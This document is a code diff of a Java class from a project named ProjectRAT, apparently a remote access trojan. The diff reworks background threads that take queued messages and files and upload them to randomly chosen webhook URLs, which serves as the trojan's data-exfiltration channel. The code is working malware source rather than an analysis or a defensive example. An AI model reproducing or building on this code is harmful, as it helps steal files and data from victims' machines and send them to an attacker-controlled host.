@@ -18,61 +18,62 @@ import java.util.Random;
 
 public class RequestHandler {
 
-    private final Queue<Object> queue = new ArrayDeque<>();
+    private final Queue<Request> queue = new ArrayDeque<>();
     private final Queue<Object> stringQueue = new ArrayDeque<>();
 
     public RequestHandler()  {
         String[] w = ProjectRAT.webhook;
 
-        new Thread(() -> {
-            while (!queue.isEmpty()) {
-                try {
-                    int randomInt = new Random().nextInt(w.length);
-                    if(queue.isEmpty())
-                        continue;
+        try {
+            new Thread(() -> {
+                for (Request item : queue) {
+                    try {
+                        int randomInt = new Random().nextInt(w.length);
+                        if (queue.isEmpty())
+                            continue;
 
-                    Thread.sleep(2000);
-                    Request item = (Request) queue.poll();
+                        Thread.sleep(2000);
+                        //Request item = (Request) queue.poll();
 
-                    CloseableHttpClient client = HttpClientBuilder.create().build();
-                    // TODO: @Momin maybe embeds?
-                    if(item.getMessage() != null) {
-                        HttpPost request = new HttpPost(w[randomInt]);
-                        JSONObject json = new JSONObject();
-                        json.put("title",item.getClass().getSimpleName());
-                        json.put("content",String.format("```%s```",item.getMessage()));
-                        StringEntity options = new StringEntity(json.toJSONString(), ContentType.APPLICATION_JSON);
-                        request.setEntity(options);
-                        HttpResponse response = client.execute(request);
-                        System.out.println(response);
-                    }
-
-                    if(item.getFiles() != null){
-                        for(File file: item.getFiles()){
+                        CloseableHttpClient client = HttpClientBuilder.create().build();
+                        // TODO: @Momin maybe embeds?
+                        if (item.getMessage() != null) {
                             HttpPost request = new HttpPost(w[randomInt]);
-
-                            MultipartEntityBuilder multipartEntityBuilder = MultipartEntityBuilder
-                                    .create()
-                                    .addPart("_mom_i5n_", new FileBody(file));
-
-                            request.setEntity(multipartEntityBuilder.build());
+                            JSONObject json = new JSONObject();
+                            json.put("title", item.getClass().getSimpleName());
+                            json.put("content", String.format("```%s```", item.getMessage()));
+                            StringEntity options = new StringEntity(json.toJSONString(), ContentType.APPLICATION_JSON);
+                            request.setEntity(options);
                             HttpResponse response = client.execute(request);
                             System.out.println(response);
                         }
-                    }
-                    client.close();
 
-                }catch (Exception e) {
-                    e.printStackTrace();
+                        if (item.getFiles() != null) {
+                            for (File file : item.getFiles()) {
+                                HttpPost request = new HttpPost(w[randomInt]);
+
+                                MultipartEntityBuilder multipartEntityBuilder = MultipartEntityBuilder
+                                        .create()
+                                        .addPart("_mom_i5n_", new FileBody(file));
+
+                                request.setEntity(multipartEntityBuilder.build());
+                                HttpResponse response = client.execute(request);
+                                System.out.println(response);
+                            }
+                        }
+                        client.close();
+
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                    }
                 }
-           }
-        }).start();
+            }).start();
 
         new Thread(() -> {
-            while (!stringQueue.isEmpty()) {
+            for (Object queueItem: stringQueue){
                 try {
                     int randomInt = new Random().nextInt(w.length);
-                    Object queueItem = stringQueue.poll();
+                    //Object queueItem = stringQueue.poll();
                     Thread.sleep(2000);
                     CloseableHttpClient client = HttpClientBuilder.create().build();
                     if (queueItem instanceof String) {
@@ -92,6 +93,8 @@ public class RequestHandler {
                 }
             }
         }).start();
+
+    }catch (Exception e){}
     }
 
     public void sendRequest(Request request) {
